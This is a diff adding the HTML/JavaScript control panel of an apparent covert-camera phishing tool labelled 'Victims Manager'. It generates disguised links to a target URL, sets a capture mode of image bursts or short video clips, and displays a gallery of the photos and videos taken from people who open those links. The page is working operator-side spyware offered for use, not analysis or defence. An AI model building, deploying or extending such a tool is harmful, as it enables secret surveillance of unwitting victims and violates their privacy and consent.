@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HJH Admin Panel</title>
+    <link rel="icon" href="https://i.postimg.cc/dVWsQpKw/IMG-20250913-WA0039.jpg">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <style>
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4f46e5; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .toast { transition: transform 0.3s ease-in-out; }
+    </style>
+</head>
+<body class="bg-slate-50 text-slate-800 min-h-screen font-sans">
+    <div class="max-w-4xl mx-auto p-4">
+        <div class="flex flex-col md:flex-row items-center justify-between mb-6 pt-4 gap-4">
+            <div class="flex items-center gap-4">
+                <img src="https://i.postimg.cc/dVWsQpKw/IMG-20250913-WA0039.jpg" class="w-16 h-16 rounded-full border-2 border-indigo-100 shadow-md">
+                <div>
+                    <h1 class="text-3xl font-black tracking-tight text-slate-900">Victims Manager</h1>
+                    <span class="text-xs bg-indigo-100 text-indigo-700 px-2 py-1 rounded font-bold">POWERED BY HJH OFFICIAL</span>
+                </div>
+            </div>
+            <button onclick="toggleImport()" class="text-sm text-slate-500 hover:text-indigo-600 font-bold bg-white px-4 py-2 rounded-lg shadow-sm border border-slate-200">
+                <i class="bi bi-box-arrow-in-down"></i> Import Session
+            </button>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
+            <a href="https://whatsapp.com/channel/0029VbAaNJ6C1FuB0mIAx93M" target="_blank" class="flex items-center justify-center gap-3 bg-[#25D366] hover:bg-[#20bd5a] text-white p-4 rounded-2xl shadow-md transition transform hover:scale-[1.02]">
+                <i class="bi bi-whatsapp text-2xl"></i>
+                <span class="font-bold text-lg">⫷HJH⫸</span>
+            </a>
+            <a href="https://hamza-jutt.pages.dev/" target="_blank" class="flex items-center justify-center gap-3 bg-slate-900 hover:bg-slate-800 text-white p-4 rounded-2xl shadow-md transition transform hover:scale-[1.02]">
+                <i class="bi bi-tools text-xl"></i>
+                <span class="font-bold text-lg">Open HJH Toolkit</span>
+            </a>
+        </div>
+
+        <div id="importBox" class="hidden mb-6 bg-indigo-50 border border-indigo-200 p-4 rounded-xl">
+            <div class="flex gap-2">
+                <input type="text" id="importKey" placeholder="Paste ID:KEY string here..." class="flex-1 p-2 border border-indigo-200 rounded-lg">
+                <button onclick="runImport()" class="bg-indigo-600 text-white px-4 py-2 rounded-lg font-bold">Import</button>
+            </div>
+        </div>
+
+        <div class="bg-white shadow-lg rounded-2xl p-6 mb-8 border border-slate-100">
+            <h2 class="text-lg font-bold text-slate-700 mb-4 flex items-center gap-2"><i class="bi bi-magic text-indigo-500"></i> Create Link For Target</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-xs font-bold text-slate-400 mb-1">TARGET URL</label>
+                    <input type="text" id="targetUrl" placeholder="https://example.com" class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg focus:ring-2 focus:ring-indigo-500 outline-none">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-400 mb-1">CUSTOM ALIAS</label>
+                    <input type="text" id="linkAlias" placeholder="optional-name" class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg focus:ring-2 focus:ring-indigo-500 outline-none">
+                </div>
+                <div class="md:col-span-2">
+                    <label class="block text-xs font-bold text-slate-400 mb-1">CAPTURE MODE</label>
+                    <select id="captureMode" class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none cursor-pointer">
+                        <option value="burst-5">📸 Burst: 5 Images (Recommended)</option>
+                        <option value="burst-10">📸 Burst: 10 Images</option>
+                        <option value="burst-15">📸 Burst: 15 Images</option>
+                        <option value="video-5">🎥 Video: 5 Seconds</option>
+                        <option value="video-10">🎥 Video: 10 Seconds</option>
+                        <option value="video-15">🎥 Video: 15 Seconds</option>
+                    </select>
+                </div>
+            </div>
+            <button onclick="createLink()" id="genBtn" class="w-full mt-4 bg-indigo-600 text-white font-bold py-3 rounded-xl hover:bg-indigo-700 transition shadow-lg shadow-indigo-200">
+                Generate Link
+            </button>
+        </div>
+
+        <div id="myLinksCard">
+            <div class="flex justify-between items-center mb-2">
+                <h3 class="font-bold text-slate-400 uppercase text-xs tracking-wider">Your Active Links</h3>
+                <button onclick="clearAllLinks()" class="text-xs text-red-500 hover:text-red-700 font-bold">
+                    <i class="bi bi-trash"></i> Clear All
+                </button>
+            </div>
+            <div id="linkList" class="space-y-4"></div>
+        </div>
+
+        <div id="gallerySection" class="hidden">
+            <button onclick="closeGallery()" class="mb-4 text-slate-600 font-bold hover:text-indigo-600 transition">
+                <i class="bi bi-arrow-left"></i> Back to Dashboard
+            </button>
+            <div id="galleryGrid" class="grid grid-cols-2 md:grid-cols-3 gap-4"></div>
+        </div>
+    </div>
+
+    <div id="toast" class="fixed bottom-4 right-4 bg-green-600 text-white px-4 py-2 rounded-lg shadow-lg transform translate-y-20 transition-all duration-300 hidden z-50">
+        <span id="toastMessage">Copied!</span>
+    </div>
+
+    <script>
+        const API_BASE = window.location.hostname === 'localhost' ? 'http://localhost:3000' : '';
+        
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            const toastMsg = document.getElementById('toastMessage');
+            toastMsg.textContent = message;
+            
+            toast.className = 'fixed bottom-4 right-4 px-4 py-2 rounded-lg shadow-lg transform translate-y-20 transition-all duration-300 hidden z-50';
+            
+            if (type === 'success') toast.classList.add('bg-green-600', 'text-white');
+            else if (type === 'error') toast.classList.add('bg-red-600', 'text-white');
+            else if (type === 'info') toast.classList.add('bg-blue-600', 'text-white');
+            
+            toast.classList.remove('hidden');
+            setTimeout(() => toast.classList.remove('translate-y-20'), 10);
+            
+            setTimeout(() => {
+                toast.classList.add('translate-y-20');
+                setTimeout(() => toast.classList.add('hidden'), 300);
+            }, 3000);
+        }
+
+        function getSavedLinks() {
+            const data = localStorage.getItem('hjh_links');
+            return data ? JSON.parse(data) : [];
+        }
+
+        function saveLinkToStorage(id, key, target, mode, alias = null) {
+            const links = getSavedLinks();
+            if(!links.find(l => l.id === id)) {
+                links.unshift({ id, key, target, mode, alias, created: new Date().toISOString() });
+                localStorage.setItem('hjh_links', JSON.stringify(links));
+            }
+            renderLinks();
+            showToast('Link created!', 'success');
+        }
+
+        function clearAllLinks() {
+            if(confirm('Delete all links?')) {
+                localStorage.removeItem('hjh_links');
+                renderLinks();
+                showToast('All links cleared', 'info');
+            }
+        }
+
+        function deleteLink(id) {
+            const links = getSavedLinks();
+            const filtered = links.filter(link => link.id !== id);
+            localStorage.setItem('hjh_links', JSON.stringify(filtered));
+            renderLinks();
+            showToast('Link deleted', 'info');
+        }
+
+        async function createLink() {
+            const target = document.getElementById('targetUrl').value.trim();
+            const alias = document.getElementById('linkAlias').value.trim();
+            const mode = document.getElementById('captureMode').value;
+
+            if(!target || !target.startsWith('http')) {
+                showToast('Enter a valid URL', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('genBtn');
+            btn.innerHTML = '<span class="loader"></span>';
+            btn.disabled = true;
+
+            try {
+                const res = await fetch(API_BASE + '/api/create', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, alias, mode })
+                });
+                
+                const data = await res.json();
+                
+                if(!res.ok) throw new Error(data.error || 'Failed');
+                
+                saveLinkToStorage(data.id, data.key, target, mode, alias);
+                document.getElementById('targetUrl').value = '';
+                document.getElementById('linkAlias').value = '';
+                
+            } catch(e) { 
+                showToast(e.message || 'Error creating link', 'error'); 
+            }
+            
+            btn.innerHTML = 'Generate Link';
+            btn.disabled = false;
+        }
+
+        function renderLinks() {
+            const links = getSavedLinks();
+            const container = document.getElementById('linkList');
+            container.innerHTML = "";
+            
+            if(links.length === 0) {
+                container.innerHTML = '<p class="text-center text-slate-400 py-4">No links yet.</p>';
+                return;
+            }
+
+            links.forEach(link => {
+                const publicLink = window.location.origin + '/' + link.id;
+                const manageLink = link.id + ":" + link.key;
+                
+                let modeLabel = link.mode.includes('video') ? '🎥 Video' : '📸 Burst';
+                let modeColor = link.mode.includes('video') ? 'bg-purple-100 text-purple-700' : 'bg-blue-100 text-blue-700';
+
+                container.innerHTML += `
+                <div class="bg-white p-5 rounded-xl shadow-sm border border-slate-200 hover:shadow-md transition">
+                    <div class="flex justify-between items-start mb-2">
+                        <div>
+                            <span class="font-mono font-bold text-lg text-slate-800">/${link.id}</span>
+                            <div class="text-xs text-slate-400 truncate max-w-[200px] mt-1">${link.target}</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="text-xs ${modeColor} px-2 py-1 rounded font-bold">${modeLabel}</span>
+                            <button onclick="deleteLink('${link.id}')" class="text-red-400 hover:text-red-600">
+                                <i class="bi bi-trash"></i>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="flex gap-2 mt-4">
+                        <button onclick="copyTxt('${publicLink}')" class="flex-1 bg-slate-100 py-2 rounded-lg text-sm font-bold text-slate-600 hover:bg-slate-200">Copy Link</button>
+                        <button onclick="openGallery('${link.id}', '${link.key}')" class="flex-1 bg-indigo-600 py-2 rounded-lg text-sm font-bold text-white hover:bg-indigo-700">View Data</button>
+                        <button onclick="copyTxt('${manageLink}')" class="px-3 bg-slate-800 text-white rounded-lg hover:bg-black" title="Backup Key"><i class="bi bi-key"></i></button>
+                    </div>
+                </div>`;
+            });
+        }
+
+        async function openGallery(id, key) {
+            document.getElementById('myLinksCard').classList.add('hidden');
+            document.getElementById('gallerySection').classList.remove('hidden');
+            const grid = document.getElementById('galleryGrid');
+            grid.innerHTML = '<p class="col-span-full text-center py-10"><span class="loader"></span> Loading...</p>';
+            
+            try {
+                const res = await fetch(API_BASE + '/api/data/' + id, { 
+                    headers: { 'x-secret-key': key } 
+                });
+                
+                if(!res.ok) {
+                    grid.innerHTML = '<p class="col-span-full text-center text-red-500 font-bold">Access Denied</p>';
+                    return;
+                }
+                
+                const items = await res.json();
+                grid.innerHTML = "";
+                
+                if(items.length === 0) {
+                    grid.innerHTML = "<p class='col-span-full text-center text-slate-400'>No captures yet.</p>";
+                    return;
+                }
+
+                items.forEach(item => {
+                    let content = item.data.startsWith('data:video') 
+                        ? `<video src="${item.data}" controls class="w-full rounded-lg bg-black"></video>` 
+                        : `<img src="${item.data}" class="w-full rounded-lg shadow-sm border border-slate-100">`;
+                    
+                    grid.innerHTML += `
+                    <div class="bg-white p-2 rounded-xl shadow-sm">
+                        ${content}
+                        <div class="text-xs text-center text-slate-400 mt-2">
+                            ${new Date(item.ts).toLocaleTimeString()}
+                        </div>
+                    </div>`;
+                });
+            } catch(error) {
+                grid.innerHTML = '<p class="col-span-full text-center text-red-500">Error loading</p>';
+            }
+        }
+
+        function closeGallery() {
+            document.getElementById('gallerySection').classList.add('hidden');
+            document.getElementById('myLinksCard').classList.remove('hidden');
+        }
+        
+        function toggleImport() { 
+            document.getElementById('importBox').classList.toggle('hidden'); 
+        }
+        
+        async function runImport() {
+            const input = document.getElementById('importKey').value.trim();
+            if(!input.includes(":")) {
+                showToast('Use ID:KEY format', 'error');
+                return;
+            }
+            
+            const [id, key] = input.split(":");
+            const btn = event.target;
+            btn.innerHTML = '<span class="loader"></span>';
+            btn.disabled = true;
+            
+            try {
+                const res = await fetch(API_BASE + '/api/check/' + id, { 
+                    headers: { 'x-secret-key': key } 
+                });
+                
+                if(res.ok) {
+                    const info = await res.json();
+                    saveLinkToStorage(id, key, info.target, info.mode, info.alias);
+                    showToast('Imported!', 'success');
+                    document.getElementById('importKey').value = "";
+                    toggleImport();
+                } else {
+                    showToast('Invalid ID/Key', 'error');
+                }
+            } catch(e) {
+                showToast('Import failed', 'error');
+            }
+            
+            btn.innerHTML = 'Import';
+            btn.disabled = false;
+        }
+        
+        function copyTxt(text) {
+            navigator.clipboard.writeText(text);
+            showToast('Copied!');
+        }
+        
+        renderLinks();
+    </script>
+</body>
+  </html>
